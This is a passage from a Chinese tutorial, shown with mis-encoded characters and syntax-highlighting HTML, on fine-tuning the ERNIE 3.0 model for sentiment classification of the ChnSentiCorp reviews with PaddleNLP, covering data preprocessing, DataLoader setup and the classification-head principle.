<span class="hljs-built_in">print</span>(<span class="hljs-string">f"æµ‹è¯•é›†æ ·æœ¬æ•°é‡: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(test_ds)}</span>"</span>)
</code></pre>
<h4 data-id="heading-9">3.2 æ¢ç´¢æ•°æ®</h4>
<p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æ•°æ®é›†ä¸­çš„æ ·æœ¬é•¿ä»€ä¹ˆæ ·ã€‚æ¯ä¸ªæ ·æœ¬éƒ½æ˜¯ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«Â <code>text</code>Â (è¯„è®ºæ–‡æœ¬) å’ŒÂ <code>label</code>Â (æƒ…æ„Ÿæ ‡ç­¾) ä¸¤ä¸ªå­—æ®µã€‚</p>
<p>In [39]</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ‰“å°å‡ æ¡è®­ç»ƒé›†æ ·æœ¬</span>
<span class="hljs-comment"># lableå€¼ä¸º1ï¼Œåˆ™ä¸ºç§¯æï¼›å€¼ä¸º0ï¼Œåˆ™ä¸ºæ¶ˆæã€‚æ¨¡å‹å­¦ä¹ çš„ç›®æ ‡å°±æ˜¯çœ‹åˆ°textï¼ŒçŒœlabel</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n--- è®­ç»ƒé›†æ ·æœ¬ç¤ºä¾‹ ---"</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ ·æœ¬ <span class="hljs-subst">{i}</span>:"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  æ–‡æœ¬: <span class="hljs-subst">{train_ds[i][<span class="hljs-string">'text'</span>]}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  æ ‡ç­¾: <span class="hljs-subst">{train_ds[i][<span class="hljs-string">'label'</span>]}</span> (<span class="hljs-subst">{<span class="hljs-string">'ç§¯æ'</span> <span class="hljs-keyword">if</span> train_ds[i][<span class="hljs-string">'label'</span>] == <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">'æ¶ˆæ'</span>}</span>)"</span>)

<span class="hljs-comment"># æ‰“å°å‡ æ¡å¼€å‘é›†æ ·æœ¬</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n--- å¼€å‘é›†æ ·æœ¬ç¤ºä¾‹ ---"</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ ·æœ¬ <span class="hljs-subst">{i}</span>:"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  æ–‡æœ¬: <span class="hljs-subst">{dev_ds[i][<span class="hljs-string">'text'</span>]}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  æ ‡ç­¾: <span class="hljs-subst">{dev_ds[i][<span class="hljs-string">'label'</span>]}</span> (<span class="hljs-subst">{<span class="hljs-string">'ç§¯æ'</span> <span class="hljs-keyword">if</span> dev_ds[i][<span class="hljs-string">'label'</span>] == <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">'æ¶ˆæ'</span>}</span>)"</span>)
</code></pre>
<h4 data-id="heading-10">3.3 æ•°æ®é¢„å¤„ç†ä¸ Tokenization</h4>
<p>ä¸ºäº†è®©æ•°æ®èƒ½è¢«ERNIEæ¨¡å‹å¤„ç†ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œä¸¤ä¸ªå…³é”®æ­¥éª¤ï¼š</p>
<ol>
<li><strong>Tokenization</strong>ï¼šå°†åŸå§‹çš„æ–‡æœ¬å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ¨¡å‹èƒ½å¤Ÿç†è§£çš„æ•°å­—IDåºåˆ—ã€‚è¿™ä¸ªè¿‡ç¨‹ç”±Â <strong>Tokenizer</strong>Â å®Œæˆã€‚</li>
<li><strong>æ ¼å¼è½¬æ¢</strong>ï¼šå°†Tokenizedåçš„æ•°æ®æ•´ç†æˆæ¨¡å‹è®­ç»ƒæ—¶æ¥å—çš„æ ¼å¼ï¼ˆå¦‚å­—å…¸ï¼‰ï¼Œå¹¶è½¬æ¢ä¸ºÂ <code>paddle.Tensor</code>ã€‚</li>
</ol>
<h5 data-id="heading-11">3.3.1 åŠ è½½ Tokenizer</h5>
<p>PaddleNLPä¸ºæ¯ä¸ªé¢„è®­ç»ƒæ¨¡å‹éƒ½æä¾›äº†é…å¥—çš„Tokenizerã€‚æˆ‘ä»¬é€‰æ‹©ä¸Â <code>ernie-3.0-medium-zh</code>Â æ¨¡å‹åŒ¹é…çš„Â <code>ErnieTokenizer</code>ã€‚</p>
<p>In [40]</p>
<pre><code class="hljs language-ini" lang="ini">from paddlenlp.transformers import AutoTokenizer

<span class="hljs-comment"># å®šä¹‰è¦ä½¿ç”¨çš„æ¨¡å‹åç§°</span>
<span class="hljs-attr">MODEL_NAME</span> = <span class="hljs-string">"ernie-3.0-medium-zh"</span>

<span class="hljs-comment"># åŠ è½½å¯¹åº”çš„Tokenizerï¼ŒAutoTokenizeræ˜¯PaddleNLPæä¾›çš„ä¸€ä¸ªè‡ªåŠ¨åŒ–å·¥å…·ï¼Œä¼šæ ¹æ®ç»™å®šçš„æ¨¡å‹åç§°ï¼ŒåŠ è½½å¯¹åº”çš„åˆ†è¯å™¨</span>
<span class="hljs-attr">tokenizer</span> = AutoTokenizer.from_pretrained(MODEL_NAME)
</code></pre>
<h5 data-id="heading-12">3.3.2 æ„é€ æ•°æ®å¤„ç†å‡½æ•°</h5>
<p>æˆ‘ä»¬å°†å®šä¹‰ä¸€ä¸ªÂ <code>convert_example</code>Â å‡½æ•°ï¼Œå®ƒè´Ÿè´£å¯¹<strong>å•ä¸ªæ ·æœ¬</strong>è¿›è¡Œå¤„ç†ã€‚è¯¥å‡½æ•°ä¼šï¼š</p>
<ol>
<li>è°ƒç”¨Â <code>tokenizer</code>Â å¯¹æ–‡æœ¬è¿›è¡Œç¼–ç ã€‚</li>
<li>è¿”å›ä¸€ä¸ªåŒ…å«Â <code>input_ids</code>,Â <code>token_type_ids</code>Â å’ŒÂ <code>label</code>Â çš„å­—å…¸ã€‚</li>
</ol>
<p><code>tokenizer()</code>Â å‡½æ•°ä¼šä¸ºæˆ‘ä»¬è‡ªåŠ¨å®Œæˆå¤§éƒ¨åˆ†å·¥ä½œï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>å°†æ–‡æœ¬åˆ‡åˆ†æˆå­—æˆ–è¯ (Token)ã€‚</li>
<li>å°†Tokenè½¬æ¢ä¸ºæ•°å­—IDã€‚</li>
<li>æ·»åŠ ç‰¹æ®Šçš„Tokenï¼Œå¦‚Â <code>[CLS]</code>ï¼ˆé€šå¸¸ç”¨ä½œå¥å­çº§åˆ«çš„è¡¨ç¤ºï¼‰å’ŒÂ <code>[SEP]</code>ï¼ˆåˆ†éš”ç¬¦ï¼‰ã€‚</li>
</ul>
<p>In [41]</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> functools

<span class="hljs-comment"># example è¡¨ç¤ºä¸€ä¸ªè¾“å…¥çš„æ•°æ®</span>
<span class="hljs-comment"># è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯ï¼šå°†æ¯æ¡æ•°æ®è½¬åŒ–ä¸ºæ¨¡å‹æ‰€éœ€è¦çš„è¾“å…¥æ ¼å¼</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_example</span>(<span class="hljs-params">example, tokenizer, max_seq_length=<span class="hljs-number">128</span></span>):
    <span class="hljs-string">"""
    å°†å•ä¸ªæ ·æœ¬è½¬æ¢ä¸ºæ¨¡å‹å¯æ¥å—çš„æ ¼å¼ã€‚
    """</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å¯¹è¾“å…¥æ–‡æœ¬è¿›è¡Œç¼–ç </span>
        encoded_inputs = tokenizer(text=example[<span class="hljs-string">"text"</span>], max_seq_len=max_seq_length)
        
        <span class="hljs-comment"># æå– input_ids å’Œ token_type_ids</span>
        <span class="hljs-comment"># input_idsï¼šæ¯ä¸ªå­—å¯¹åº”çš„æ•°å­—ID</span>
        <span class="hljs-comment"># token_type_ids ç”¨äºåŒºåˆ†ä¸åŒå¥å­ï¼Œå•å¥åˆ†ç±»ä»»åŠ¡å…¨æ˜¯0</span>
        input_ids = encoded_inputs[<span class="hljs-string">"input_ids"</span>]
        token_type_ids = encoded_inputs[<span class="hljs-string">"token_type_ids"</span>]
        

        label_str = example.get(<span class="hljs-string">"label"</span>, <span class="hljs-string">""</span>)   <span class="hljs-comment">#è·å–çš„æ ‡ç­¾æ˜¯"1"æˆ–"0" å­—ç¬¦ä¸²æ ¼å¼</span>
        <span class="hljs-keyword">if</span> label_str == <span class="hljs-string">""</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span> <span class="hljs-comment"># å¦‚æœlabelä¸ºç©ºï¼Œåˆ™è·³è¿‡è¯¥æ ·æœ¬</span>
        <span class="hljs-comment"># æŠŠæƒ…æ„Ÿæ ‡ç­¾è½¬åŒ–ä¸ºæ•´æ•°ï¼Œå¹¶åŒ…è£…ä¸ºtensoræ ¼å¼</span>
        label = paddle.to_tensor([<span class="hljs-built_in">int</span>(label_str)], dtype=<span class="hljs-string">"int64"</span>)
        
        <span class="hljs-comment"># è¿”å›æ¨¡å‹æ¥å—çš„æ ¼å¼</span>
        <span class="hljs-keyword">return</span> {<span class="hljs-string">"input_ids"</span>: input_ids, <span class="hljs-string">"token_type_ids"</span>: token_type_ids, <span class="hljs-string">"labels"</span>: label}
    
    <span class="hljs-keyword">except</span> (ValueError, TypeError):
        <span class="hljs-comment"># å¦‚æœ int() è½¬æ¢å¤±è´¥æˆ– example æ ¼å¼ä¸æ­£ç¡®ï¼Œä¹Ÿè·³è¿‡è¯¥æ ·æœ¬</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Skipping invalid sample: <span class="hljs-subst">{example}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

<span class="hljs-comment"># functools.partialï¼šå¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œå›ºå®šäº†åŸå§‹å‡½æ•°çš„æŸäº›å‚æ•°</span>
<span class="hljs-comment"># å›ºå®šäº†convert_exampleå‡½æ•°çš„tokenizer å’Œ max_seq_lengthå‚æ•°</span>
trans_func = functools.partial(convert_example, tokenizer=tokenizer, max_seq_length=<span class="hljs-number">128</span>)

<span class="hljs-comment"># -- é²æ£’æ€§æ£€æŸ¥ --</span>
<span class="hljs-comment"># æ£€æŸ¥ train_ds æ˜¯å¦å·²è¢«å¤„ç† (å³å…¶å…ƒç´ æ˜¯å¦ä¸ºå…ƒç»„)ã€‚å¦‚æœæ˜¯ï¼Œåˆ™é‡æ–°åŠ è½½åŸå§‹æ•°æ®é›†ã€‚</span>
<span class="hljs-comment"># ä¸ºäº†é˜²æ­¢ä»£ç è¢«å¤šæ¬¡è¿è¡Œæ—¶å‡ºç°æ•°æ®é‡å¤å¤„ç†çš„æƒ…å†µ</span>
<span class="hljs-keyword">if</span> train_ds <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(train_ds[<span class="hljs-number">0</span>], <span class="hljs-built_in">tuple</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ£€æµ‹åˆ°æ•°æ®é›†å·²è¢«å¤„ç†ï¼Œæ­£åœ¨é‡æ–°åŠ è½½åŸå§‹æ•°æ®é›†..."</span>)
    train_ds, dev_ds, test_ds = load_dataset(<span class="hljs-string">'chnsenticorp'</span>, splits=[<span class="hljs-string">'train'</span>, <span class="hljs-string">'dev'</span>, <span class="hljs-string">'test'</span>])
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"åŸå§‹æ•°æ®é›†å·²é‡æ–°åŠ è½½ã€‚"</span>)

<span class="hljs-comment"># ä½¿ç”¨ map æ–¹æ³•å¯¹æ•°æ®é›†ä¸­çš„æ‰€æœ‰æ ·æœ¬åº”ç”¨ trans_func</span>
<span class="hljs-comment"># lazy=False è¡¨ç¤ºç«‹åˆ»å¯¹æ•°æ®é›†è¿›è¡Œå¤„ç†ï¼›å¦‚æœæ˜¯Trueï¼Œç›´åˆ°å®é™…è®¿é—®æ—¶æ‰ä¼šè½¬æ¢</span>
<span class="hljs-comment"># mapä¼šå°†æ¯ä¸ªæ ·æœ¬éƒ½ä¼ é€’ç»™trans_funcï¼Œä»è€Œå°†æ–‡æœ¬è½¬åŒ–ä¸ºéœ€è¦çš„æ ¼å¼</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\næ­£åœ¨å¯¹æ•°æ®é›†è¿›è¡Œé¢„å¤„ç†..."</span>)
train_ds_processed_raw = train_ds.<span class="hljs-built_in">map</span>(trans_func, lazy=<span class="hljs-literal">False</span>)
dev_ds_processed_raw = dev_ds.<span class="hljs-built_in">map</span>(trans_func, lazy=<span class="hljs-literal">False</span>)
test_ds_processed_raw = test_ds.<span class="hljs-built_in">map</span>(trans_func, lazy=<span class="hljs-literal">False</span>)

<span class="hljs-comment"># è¿‡æ»¤æ‰è¿”å›å€¼ä¸º None çš„æ— æ•ˆæ ·æœ¬</span>
train_ds_processed = [item <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> train_ds_processed_raw <span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>]
dev_ds_processed = [item <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> dev_ds_processed_raw <span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>]
test_ds_processed = [item <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> test_ds_processed_raw <span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>]

<span class="hljs-comment"># é‡æ–°åŒ…è£…ä¸º MapDataset (å¯é€‰ï¼Œä½†ä¸ºäº†åç»­APIä¸€è‡´æ€§æ›´å¥½)</span>
<span class="hljs-keyword">from</span> paddlenlp.datasets <span class="hljs-keyword">import</span> MapDataset
train_ds_processed = MapDataset(train_ds_processed)
dev_ds_processed = MapDataset(dev_ds_processed)
test_ds_processed = MapDataset(test_ds_processed)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ•°æ®é¢„å¤„ç†å’Œæ¸…æ´—å®Œæˆï¼"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤„ç†åè®­ç»ƒé›†æ ·æœ¬æ•°é‡: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(train_ds_processed)}</span>"</span>)
<span class="hljs-comment"># æŸ¥çœ‹ä¸€ä¸ªå¤„ç†åçš„æ ·æœ¬</span>
<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(train_ds_processed) &gt; <span class="hljs-number">0</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å¤„ç†åçš„ç¬¬ä¸€ä¸ªè®­ç»ƒæ ·æœ¬:"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  Input IDs: <span class="hljs-subst">{train_ds_processed[<span class="hljs-number">0</span>][<span class="hljs-string">'input_ids'</span>]}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  Token Type IDs: <span class="hljs-subst">{train_ds_processed[<span class="hljs-number">0</span>][<span class="hljs-string">'token_type_ids'</span>]}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  Label: <span class="hljs-subst">{train_ds_processed[<span class="hljs-number">0</span>][<span class="hljs-string">'labels'</span>]}</span>"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ²¡æœ‰æœ‰æ•ˆçš„è®­ç»ƒæ ·æœ¬è¢«å¤„ç†ã€‚"</span>)
</code></pre>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬çš„æ•°æ®é›†å·²ç»å‡†å¤‡å¥½äº†ï¼Œæ¯ä¸ªæ ·æœ¬éƒ½åŒ…å«äº†æ¨¡å‹è®­ç»ƒæ‰€éœ€çš„Â <code>input_ids</code>,Â <code>token_type_ids</code>, å’ŒÂ <code>label</code>ã€‚</p>
<h4 data-id="heading-13">3.4 æ„é€  DataLoader</h4>
<p>æœ€åä¸€æ­¥æ˜¯å°†å¤„ç†å¥½çš„æ•°æ®é›†ç»„ç»‡æˆæ‰¹æ¬¡ (Batch) çš„å½¢å¼ï¼Œä»¥ä¾¿åœ¨è®­ç»ƒæ—¶é«˜æ•ˆåœ°é€å…¥æ¨¡å‹ã€‚æˆ‘ä»¬ä½¿ç”¨Â <code>paddle.io.DataLoader</code>Â æ¥å®Œæˆè¿™ä¸ªä»»åŠ¡ã€‚å®ƒè¿˜å¯ä»¥å¸®åŠ©æˆ‘ä»¬è¿›è¡Œæ•°æ®çš„æ‰“ä¹± (shuffle) å’Œè‡ªåŠ¨çš„æ‰¹å¤„ç†ã€‚</p>
<p>æˆ‘ä»¬ä¼šä½¿ç”¨Â <code>paddlenlp.data.DataCollatorWithPadding</code>Â æ¥è‡ªåŠ¨åœ°å°†æ¯ä¸ªæ‰¹æ¬¡å†…çš„æ ·æœ¬å¡«å…… (padding) åˆ°è¯¥æ‰¹æ¬¡ä¸­æœ€é•¿æ ·æœ¬çš„é•¿åº¦ã€‚</p>
<p>In [42]</p>
<pre><code class="hljs language-ini" lang="ini">from paddle.io import DataLoader
from paddlenlp.data import DataCollatorWithPadding

<span class="hljs-comment"># åˆå§‹åŒ– DataCollatorï¼Œå®ƒä¼šè‡ªåŠ¨å¤„ç†æ‰¹æ•°æ®çš„padding</span>
<span class="hljs-attr">collator</span> = DataCollatorWithPadding(tokenizer)

<span class="hljs-comment"># å®šä¹‰æ‰¹å¤§å°</span>
<span class="hljs-attr">batch_size</span> = <span class="hljs-number">32</span>

<span class="hljs-comment"># åˆ›å»ºDataLoaderï¼Œè´Ÿè´£æŒ‰æ‰¹æ¬¡åŠ è½½æ•°æ®</span>
<span class="hljs-attr">train_loader</span> = DataLoader(
    <span class="hljs-attr">dataset</span>=train_ds,
    <span class="hljs-attr">batch_size</span>=batch_size,
    <span class="hljs-attr">shuffle</span>=<span class="hljs-literal">True</span>, <span class="hljs-comment"># è®­ç»ƒæ—¶æ‰“ä¹±æ•°æ®</span>
    <span class="hljs-attr">collate_fn</span>=collator  <span class="hljs-comment"># ä½¿ç”¨DataCollatorWithPaddingå¯¹æ¯æ‰¹æ•°æ®è¿›è¡Œå¡«å……ï¼Œä½¿å¾—æ‰€æœ‰å¥å­çš„é•¿åº¦ç›¸åŒ</span>
)
<span class="hljs-attr">dev_loader</span> = DataLoader(
    <span class="hljs-attr">dataset</span>=dev_ds,
    <span class="hljs-attr">batch_size</span>=batch_size,
    <span class="hljs-attr">shuffle</span>=<span class="hljs-literal">False</span>, <span class="hljs-comment"># è¯„ä¼°æ—¶ä¸éœ€è¦æ‰“ä¹±</span>
    <span class="hljs-attr">collate_fn</span>=collator
)
<span class="hljs-attr">test_loader</span> = DataLoader(
    <span class="hljs-attr">dataset</span>=test_ds,
    <span class="hljs-attr">batch_size</span>=batch_size,
    <span class="hljs-attr">shuffle</span>=<span class="hljs-literal">False</span>,
    <span class="hljs-attr">collate_fn</span>=collator
)

<span class="hljs-comment"># æŸ¥çœ‹ä¸€ä¸ªæ‰¹æ¬¡çš„æ•°æ®å½¢çŠ¶</span>
print("\nDataLoaderå‡†å¤‡å®Œæˆï¼")
for batch in train_loader:
    print("ä¸€ä¸ªæ‰¹æ¬¡çš„æ•°æ®:")
    for key, value in batch.items():
        print(f"  {key}: <span class="hljs-attr">shape</span>={value.shape}<span class="hljs-string">")
    break # åªçœ‹ç¬¬ä¸€ä¸ªæ‰¹æ¬¡
</span></code></pre>
<p>è‡³æ­¤ï¼Œæ•°æ®å‡†å¤‡çš„å…¨éƒ¨å·¥ä½œå·²ç»å®Œæˆã€‚æˆ‘ä»¬æ‹¥æœ‰äº†å¯ä»¥éšæ—¶é€å…¥æ¨¡å‹è¿›è¡Œè®­ç»ƒçš„DataLoaderã€‚</p>
<h3 data-id="heading-14">4. æ¨¡å‹ä¸å¾®è°ƒåŸç†</h3>
<p>åœ¨æ•°æ®å‡†å¤‡å°±ç»ªåï¼Œæˆ‘ä»¬éœ€è¦ç†è§£æˆ‘ä»¬å°†è¦ä½¿ç”¨çš„æ¨¡å‹ä»¥åŠå¦‚ä½•è®©å®ƒé€‚åº”æˆ‘ä»¬çš„æƒ…æ„Ÿåˆ†æä»»åŠ¡ã€‚</p>
<h4 data-id="heading-15">4.1 ERNIE æ¨¡å‹ç®€ä»‹ï¼šä¸€ä½æ‡‚çŸ¥è¯†çš„è¯­è¨€å¤§å¸ˆ</h4>
<p>æ­£å¦‚å¼•è¨€ä¸­æ‰€è¯´ï¼ŒERNIE æ˜¯ä¸€ä¸ªæ›´"æ‡‚"ä¸­æ–‡çš„æ¨¡å‹ã€‚å®ƒçš„æ ¸å¿ƒä¼˜åŠ¿åœ¨äºå…¶ç‹¬ç‰¹çš„<strong>çŸ¥è¯†æ•´åˆé¢„è®­ç»ƒä»»åŠ¡</strong>ã€‚</p>
<ul>
<li>
<p><strong>ä¸€ä¸ªæ›´æ·±å…¥çš„æ¯”å–»</strong>ï¼š æƒ³è±¡ä¸€ä¸ªå­¦ç”Ÿï¼ˆå…¶ä»–æ¨¡å‹ï¼‰åœ¨å­¦ä¹ ä¸€å¥è¯ï¼š"ä¸­å›½å››å¤§å‘æ˜ä¹‹ä¸€çš„æ´»å­—å°åˆ·æœ¯æ˜¯ç”±æ¯•æ˜‡å‘æ˜çš„ã€‚" è¿™ä¸ªå­¦ç”Ÿå¯èƒ½é€šè¿‡"å•å­—å¡«ç©º"å­¦ä¼šäº†"ï¼ˆæ´»ï¼‰å­—å°åˆ·æœ¯"å’Œ"æ¯•ï¼ˆæ˜‡ï¼‰"è¿™äº›å­—ã€‚</p>
<p>è€ŒERNIEè¿™ä½"å­¦éœ¸"åˆ™ä¸åŒï¼Œè€å¸ˆä¼šç›´æ¥å°†"<strong>æ´»å­—å°åˆ·æœ¯</strong>"å’Œ"<strong>æ¯•æ˜‡</strong>"è¿™ä¸¤ä¸ªå®Œæ•´çš„çŸ¥è¯†å•å…ƒç›–ä½ï¼Œè®©ä»–å»é¢„æµ‹ã€‚ä¸ºäº†èƒ½ç­”å¯¹ï¼ŒERNIEä¸ä»…ä»…è¦å­¦ä¹ è¯­è¨€çš„æµç•…æ€§ï¼Œæ›´è¢«è¿«å»ç†è§£"æ´»å­—å°åˆ·æœ¯"æ˜¯ä¸€ä¸ªå®Œæ•´çš„æŠ€æœ¯æ¦‚å¿µï¼Œ"æ¯•æ˜‡"æ˜¯ä¸€ä¸ªäººåï¼Œå¹¶ä¸”è¿™ä¸¤ä¸ªçŸ¥è¯†å•å…ƒä¹‹é—´å­˜åœ¨"å‘æ˜"çš„å…³è”ã€‚</p>
<p>é€šè¿‡åœ¨æµ·é‡æ–‡æœ¬ä¸Šè¿›è¡Œè¿™ç§"çŸ¥è¯†ç‚¹æŒ–æ˜"å¼çš„å­¦ä¹ ï¼ŒERNIEæ„å»ºäº†æ›´æ·±å±‚æ¬¡çš„è¯­ä¹‰ç†è§£èƒ½åŠ›ï¼Œè€Œä¸ä»…ä»…æ˜¯è¡¨é¢çš„æ–‡å­—ç»„åˆã€‚</p>
</li>
</ul>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆERNIEåœ¨éœ€è¦ç†è§£å¥å­æ·±å±‚å«ä¹‰çš„ä»»åŠ¡ï¼ˆå¦‚æƒ…æ„Ÿåˆ†æï¼‰ä¸Šé€šå¸¸è¡¨ç°å¾—æ›´å¥½çš„åŸå› ã€‚</p>
<h4 data-id="heading-16">4.2 å¾®è°ƒ (Fine-tuning) åŸç†ï¼šä¸ºè¯­è¨€å¤§å¸ˆé…ä¸Š"æƒ…æ„Ÿåˆ†æçœ¼é•œ"</h4>
<p>æˆ‘ä»¬åŠ è½½çš„Â <code>ernie-3.0-medium-zh</code>Â æ¨¡å‹æ˜¯ä¸€ä½åšå­¦çš„"é€šæ‰"ï¼Œå®ƒæ‡‚å¾—è¯­è¨€çš„å„ç§çŸ¥è¯†ï¼Œä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒå¹¶ä¸çŸ¥é“è‡ªå·±éœ€è¦åš"æƒ…æ„Ÿåˆ†æ"è¿™é¡¹å…·ä½“å·¥ä½œã€‚<strong>å¾®è°ƒ (Fine-tuning)</strong> Â çš„è¿‡ç¨‹ï¼Œå°±å¥½æ¯”æ˜¯ä¸ºè¿™ä½è¯­è¨€å¤§å¸ˆé…ä¸Šä¸€å‰¯ç‰¹åˆ¶çš„"æƒ…æ„Ÿåˆ†æçœ¼é•œ"ï¼Œå¹¶æŒ‡å¯¼ä»–å¦‚ä½•ä½¿ç”¨ã€‚</p>
<p>è¿™ä¸ªè¿‡ç¨‹åˆ†ä¸ºå‡ æ­¥ï¼š</p>
<ol>
<li>
<p><strong>è·å–å¥å­çš„"çµé­‚"â€”â€”[CLS]è¾“å‡º</strong>ï¼š</p>
<ul>
<li>æˆ‘ä»¬å°†ä¸€æ¡è¯„è®ºæ–‡æœ¬ï¼ˆä¾‹å¦‚"è¿™å®¶åº—çš„æ‹‰é¢çœŸå¥½åƒï¼"ï¼‰é€å…¥ERNIEæ¨¡å‹ã€‚åœ¨é€å…¥å‰ï¼Œæˆ‘ä»¬åœ¨æ–‡æœ¬æœ€å‰é¢åŠ ä¸Šä¸€ä¸ªç‰¹æ®Šçš„æ ‡å¿—Â <code>[CLS]</code>Â (Classification)ã€‚</li>
<li>ç»è¿‡ERNIEå†…éƒ¨å¤æ‚çš„è®¡ç®—ï¼ˆå¤šå±‚Transformerï¼‰ï¼Œæ¯ä¸ªå­—è¯éƒ½ä¼šå¾—åˆ°ä¸€ä¸ªå¯Œå«ä¸Šä¸‹æ–‡ä¿¡æ¯çš„å‘é‡ã€‚è€Œè¿™ä¸ªç‰¹æ®Šçš„Â <code>[CLS]</code>Â æ ‡å¿—ï¼Œåœ¨ç»è¿‡æ•´ä¸ªæ¨¡å‹åï¼Œå®ƒå¯¹åº”çš„è¾“å‡ºå‘é‡ (<code>pooled_output</code>) å°±è¢«è®¾è®¡ä¸ºå‡èšäº†æ•´ä¸ªå¥å­çš„æ ¸å¿ƒè¯­ä¹‰ã€‚æˆ‘ä»¬å¯ä»¥æŠŠå®ƒæ¯”ä½œERNIEè¯»å®Œä¸€å¥è¯åï¼Œåœ¨è„‘æµ·ä¸­å½¢æˆçš„å¯¹è¿™å¥è¯çš„"æ•´ä½“å°è±¡"æˆ–"çµé­‚"å‘é‡ã€‚</li>
</ul>
</li>
<li>
<p><strong>å®‰è£…"æƒ…æ„Ÿåˆ†æé•œç‰‡"â€”â€”æ·»åŠ åˆ†ç±»å¤´</strong>ï¼š</p>
<ul>
<li>è¿™ä¸ª"çµé­‚"å‘é‡ï¼ˆä¾‹å¦‚ä¸€ä¸ª768ç»´çš„å‘é‡ï¼‰æœ¬èº«è¿˜åªæ˜¯ä¸€ä¸²æ•°å­—ï¼Œä¸ç›´æ¥ä»£è¡¨"ç§¯æ"æˆ–"æ¶ˆæ"ã€‚</li>
<li>æˆ‘ä»¬åœ¨è¿™ä¸²æ•°å­—åé¢æ¥ä¸Šä¸€ä¸ªéå¸¸ç®€å•çš„"é•œç‰‡"â€”â€”ä¸€ä¸ª<strong>å…¨è¿æ¥å±‚ (Linear Layer)</strong> ã€‚è¿™ä¸ªå…¨è¿æ¥å±‚å°±æ˜¯"åˆ†ç±»å¤´"ï¼Œå®ƒçš„ä»»åŠ¡éå¸¸ä¸“ä¸€ï¼šæ¥æ”¶ä»£è¡¨å¥å­çµé­‚çš„å‘é‡ï¼Œç„¶åå°†å…¶è½¬æ¢ä¸ºå¯¹æˆ‘ä»¬ä»»åŠ¡æœ‰æ„ä¹‰çš„è¾“å‡ºã€‚</li>
<li>åœ¨æˆ‘ä»¬çš„äºŒåˆ†ç±»ä»»åŠ¡ä¸­ï¼Œè¿™ä¸ª"é•œç‰‡"æœ‰ä¸¤ä¸ªè¾“å‡ºç¥ç»å…ƒï¼Œä¸€ä¸ªä»£è¡¨"æ¶ˆæ"çš„å¯èƒ½æ€§ï¼Œä¸€ä¸ªä»£è¡¨"ç§¯æ"çš„å¯èƒ½æ€§ã€‚</li>
</ul>
</li>
<li>
<p><strong>"æ ¡å‡†çœ¼é•œ"â€”â€”è®­ç»ƒä¸åå‘ä¼ æ’­</strong>ï¼š</p>
<ul>
<li>ç°åœ¨ï¼Œæˆ‘ä»¬æœ‰äº†ä¸€ä¸ªæˆ´ç€"æƒ…æ„Ÿåˆ†æçœ¼é•œ"çš„ERNIEæ¨¡å‹ã€‚æˆ‘ä»¬æŠŠå‡†å¤‡å¥½çš„æ ‡æ³¨æ•°æ®ï¼ˆæˆåƒä¸Šä¸‡æ¡å·²çŸ¥æƒ…æ„Ÿçš„è¯„è®ºï¼‰å–‚ç»™å®ƒã€‚</li>
